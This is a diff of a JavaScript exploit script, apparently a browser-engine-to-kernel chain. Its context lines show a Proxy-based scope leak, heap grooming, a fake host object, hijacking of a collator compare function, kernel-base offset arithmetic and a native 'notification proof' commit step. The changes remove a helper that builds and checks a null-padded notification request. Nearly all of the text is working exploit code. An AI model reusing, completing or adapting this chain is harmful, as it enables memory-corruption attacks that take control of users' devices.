@@ -215,9 +215,6 @@ let arenaBuffer = null;
 let arenaView = null;
 let realCollator = null;
 let compareFn = null;
-let notificationRequest = "";
-let notificationRequestOK = false;
-let notificationPrewarmResult = 0;
 let targetHolder = null;
 let holderGuardA = null;
 let holderGuardB = null;
@@ -631,9 +628,6 @@ function resetAttemptState() {
     arenaView = null;
     realCollator = null;
     compareFn = null;
-    notificationRequest = "";
-    notificationRequestOK = false;
-    notificationPrewarmResult = 0;
     targetHolder = null;
     holderGuardA = null;
     holderGuardB = null;
@@ -770,35 +764,6 @@ function startAttempt() {
     }
 }
 
-function buildNotificationRequest() {
-    const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET
-        - NOTIFICATION_MESSAGE.length;
-    if (trailing < 1)
-        throw new Error("notification-message-too-long");
-    notificationRequest = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET)
-        + NOTIFICATION_MESSAGE + "\x00".repeat(trailing);
-    notificationRequestOK = notificationRequest.length
-        === NOTIFICATION_REQUEST_SIZE;
-    for (let p = 0; p < NOTIFICATION_MESSAGE_OFFSET; ++p) {
-        if (notificationRequest.charCodeAt(p) !== 0)
-            notificationRequestOK = false;
-    }
-    for (let m = 0; m < NOTIFICATION_MESSAGE.length; ++m) {
-        const messageCode = notificationRequest.charCodeAt(
-            NOTIFICATION_MESSAGE_OFFSET + m);
-        if (messageCode !== NOTIFICATION_MESSAGE.charCodeAt(m)
-            || messageCode > 0x7f)
-            notificationRequestOK = false;
-    }
-    for (let t = NOTIFICATION_MESSAGE_OFFSET + NOTIFICATION_MESSAGE.length;
-        t < NOTIFICATION_REQUEST_SIZE; ++t) {
-        if (notificationRequest.charCodeAt(t) !== 0)
-            notificationRequestOK = false;
-    }
-    if (!notificationRequestOK)
-        throw new Error("notification-request-layout-failed");
-}
-
 function leakScopeObject() {
     class Leaker { leak() { return super.foo; } }
     Leaker.prototype.__proto__ = new Proxy({}, {
@@ -861,10 +826,6 @@ function buildFakeHost() {
     compareFn = realCollator.compare;
     if (!(compareFn("a", "b") < 0))
         throw new Error("collator-prewarm-failed");
-    buildNotificationRequest();
-    notificationPrewarmResult = compareFn(notificationRequest, "b");
-    if (!Number.isFinite(notificationPrewarmResult))
-        throw new Error("notification-request-prewarm-failed");
     holderGuardA = { marker: 0x484f4c44 };
     holderGuardB = { marker: 0x47554152 };
     targetHolder = {
@@ -1378,7 +1339,7 @@ function loadHistoryCritical() {
         }
 
         notifyReady = arenaFilledOK && collatorHeaderOK && compareFnHeaderOK
-            && getpidStatus === 1 && notificationRequestOK
+            && getpidStatus === 1
             && notifyAddressOK;
         if (notifyReady) {
             aimCarrier(candidate, realCollatorAddress + 0x18);
@@ -1547,10 +1508,6 @@ function reportComposition() {
     mark("NOTIFY-CONTEXT", "B+48-rdi=0-device"
         + "-B+60-rcx=0-nonblocking-B+e0=notification-export"
         + `-rsi=request-rdx=${hex(NOTIFICATION_REQUEST_SIZE)}`);
-    mark("NOTIFY-REQUEST", `size=${hex(NOTIFICATION_REQUEST_SIZE)}`
-        + `-message-offset=${hex(NOTIFICATION_MESSAGE_OFFSET)}`
-        + `-ascii=true-layout-pass=${notificationRequestOK}`
-        + `-prewarm-result=${notificationPrewarmResult}`);
     mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
     mark("NATIVE-EXECUTABLE-HEX",
         dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
@@ -1565,7 +1522,6 @@ function reportComposition() {
         && collatorHeaderOK && compareFnHeaderOK
         && getpidStatus === 1
         && notifyAddressOK
-        && notificationRequestOK
         && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
         && compositionLength === EXPECTED_LENGTH;
     try {
@@ -1610,7 +1566,6 @@ function reportComposition() {
         + `-arena=${arenaLayoutOK}-filled=${arenaFilledOK}`
         + `-collator=${collatorHeaderOK}`
         + `-compare=${compareFnHeaderOK}`
-        + `-request=${notificationRequestOK}`
         + `-target=${notifyAddressOK}`
         + `-carrier-armed=${carrierArmedForCommit}`
         + `-repeat-block=${commitBlockConfirmed}`);
@@ -1618,9 +1573,7 @@ function reportComposition() {
     setTimeout(() => { mark("SURVIVED-NO-COMMIT-T1000"); }, 1000);
 }
 
-/* =========================================================
-   CHANGED SECTION
-   ========================================================= */
+/* ---------- notification helpers ---------- */
 
 function buildNotificationRequestForMessage(msg) {
     const msgLen = msg.length;
@@ -1728,12 +1681,6 @@ function commitNotificationProof() {
         failed();
         return;
     }
-    if (!notificationRequestOK
-        || notificationRequest.length !== NOTIFICATION_REQUEST_SIZE) {
-        mark("COMMIT-ABORT", "notification-request-changed-before-commit");
-        failed();
-        return;
-    }
 
     commitStarted = true;
     const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
@@ -1745,10 +1692,6 @@ function commitNotificationProof() {
     mark("NOTIFY-SEQ-START", "Starting notification sequence");
     sendNotificationSequence();
 }
-
-/* =========================================================
-   END CHANGED SECTION
-   ========================================================= */
 
 function runGroomAndLoad() {
     try {
